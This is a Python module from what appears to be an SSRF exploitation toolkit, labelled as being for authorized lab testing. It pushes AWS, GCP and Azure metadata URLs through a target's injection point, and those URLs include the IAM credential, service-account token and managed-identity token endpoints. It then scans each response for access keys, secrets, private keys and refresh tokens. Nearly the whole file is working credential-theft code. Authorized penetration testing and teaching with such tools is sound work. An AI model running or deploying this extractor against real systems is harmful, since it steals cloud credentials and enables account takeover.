"""
sedf/modules/cloud_meta.py - Cloud metadata extraction via SSRF (FR-06)

Attempts to retrieve cloud provider metadata using SSRF payloads.
Supports AWS, GCP, and Azure.

FOR AUTHORIZED TESTING IN LAB ENVIRONMENTS ONLY.
"""

from typing import Dict, List, Optional

from sedf.utils.http_client import HTTPClient
from sedf.utils.logger import get_logger
from sedf.payloads.generator import PayloadGenerator

logger = get_logger(__name__)


class CloudMetaExtractor:
    """
    FR-06: Cloud metadata extraction module.

    Sends cloud-metadata URLs through the SSRF injection point and
    parses the response for credentials and configuration data.
    """

    # Metadata endpoints per provider
    ENDPOINTS: Dict[str, List[Dict]] = {
        "aws": [
            {"url": "http://169.254.169.254/latest/meta-data/", "label": "Instance metadata index"},
            {"url": "http://169.254.169.254/latest/meta-data/hostname", "label": "Hostname"},
            {"url": "http://169.254.169.254/latest/meta-data/iam/security-credentials/", "label": "IAM role list"},
            {"url": "http://169.254.169.254/latest/meta-data/iam/info", "label": "IAM info"},
            {"url": "http://169.254.169.254/latest/user-data", "label": "User data (startup script)"},
            {"url": "http://169.254.169.254/latest/dynamic/instance-identity/document", "label": "Instance identity"},
            {"url": "http://169.254.169.254/latest/meta-data/public-ipv4", "label": "Public IP"},
            {"url": "http://169.254.169.254/latest/meta-data/local-ipv4", "label": "Local IP"},
        ],
        "gcp": [
            {"url": "http://metadata.google.internal/computeMetadata/v1/", "label": "GCP metadata root", "headers": {"Metadata-Flavor": "Google"}},
            {"url": "http://metadata.google.internal/computeMetadata/v1/project/project-id", "label": "Project ID", "headers": {"Metadata-Flavor": "Google"}},
            {"url": "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token", "label": "Service account token", "headers": {"Metadata-Flavor": "Google"}},
            {"url": "http://metadata.google.internal/computeMetadata/v1/instance/hostname", "label": "Hostname", "headers": {"Metadata-Flavor": "Google"}},
        ],
        "azure": [
            {"url": "http://169.254.169.254/metadata/instance?api-version=2021-02-01", "label": "Instance metadata", "headers": {"Metadata": "true"}},
            {"url": "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/", "label": "Managed identity token", "headers": {"Metadata": "true"}},
        ],
    }

    def __init__(self, args, client: HTTPClient, base_url_template: str):
        self.args = args
        self.client = client
        self.base_url = base_url_template  # URL with FUZZ marker

    def run(self, provider: str = "aws") -> List[Dict]:
        """Probe cloud metadata endpoints and return findings."""
        endpoints = self.ENDPOINTS.get(provider, self.ENDPOINTS["aws"])
        logger.info(f"[CLOUD META] Probing {provider.upper()} metadata ({len(endpoints)} endpoints)")

        findings = []
        for ep in endpoints:
            result = self._probe(ep)
            if result:
                findings.append(result)
                self._print_finding(result)

        print(f"\n  Cloud metadata extraction: {len(findings)} endpoint(s) accessible.")
        return findings

    def _probe(self, endpoint: Dict) -> Optional[Dict]:
        payload = endpoint["url"]
        if "FUZZ" in self.base_url:
            url = self.base_url.replace("FUZZ", payload)
        else:
            url = payload

        resp = self.client.get(url)
        body = resp.get("body", "")
        status = resp.get("status_code", 0)

        if status == 200 and body.strip():
            sensitive = self._detect_sensitive(body)
            return {
                "endpoint": payload,
                "label": endpoint["label"],
                "status": status,
                "response_snippet": body[:500],
                "sensitive_data": sensitive,
            }
        return None

    @staticmethod
    def _detect_sensitive(body: str) -> List[str]:
        """Flag sensitive patterns in metadata responses."""
        patterns = {
            "AccessKeyId": "AWS Access Key ID found",
            "SecretAccessKey": "AWS Secret Access Key found",
            "Token": "Security token / session token found",
            "iam/security-credentials": "IAM credentials endpoint exposed",
            "private_key": "Private key material found",
            "password": "Password field found",
            "client_secret": "Client secret found",
            "refresh_token": "Refresh token found",
        }
        found = []
        for pattern, label in patterns.items():
            if pattern.lower() in body.lower():
                found.append(label)
        return found

    @staticmethod
    def _print_finding(finding: Dict):
        red = "\033[31m"
        reset = "\033[0m"
        print(f"\n  {red}[CLOUD META EXPOSED]{reset} {finding['label']}")
        print(f"  Endpoint : {finding['endpoint']}")
        if finding["sensitive_data"]:
            for s in finding["sensitive_data"]:
                print(f"  ⚠  {s}")
        print(f"  Response : {finding['response_snippet'][:200]!r}")
